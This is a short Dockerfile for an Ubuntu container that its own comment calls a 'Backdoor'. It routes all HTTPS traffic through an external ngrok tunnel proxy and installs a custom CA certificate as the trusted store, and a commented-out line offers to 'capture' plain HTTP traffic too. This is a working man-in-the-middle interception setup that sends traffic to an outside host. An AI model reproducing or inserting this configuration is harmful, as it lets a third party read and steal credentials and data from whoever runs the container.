FROM ubuntu:20.04

# Install required tools
RUN apt-get update && apt-get install curl -y

# Copy your daemon script & library into the container
COPY cacert2.pem /cacert.pem
RUN chmod +r /cacert.pem
RUN chmod -w /cacert.pem

# Do not proxy AWS specific trafic (need to adjust based on cloud environement)
ENV no_proxy="169.254.169.254,*.amazonaws.com"
# Insert Backdoor
ENV https_proxy="http://7.tcp.eu.ngrok.io:11159"
#ENV http_proxy="http://4.tcp.eu.ngrok.io:11125" #Only enebale this if you want to capute HTTP traffic (do NOT enable this for AWS stuff as aws stuff tries>
ENV SSL_CERT_FILE=/cacert.pem


# Set the default command to run when the container starts
CMD ["/bin/bash"]
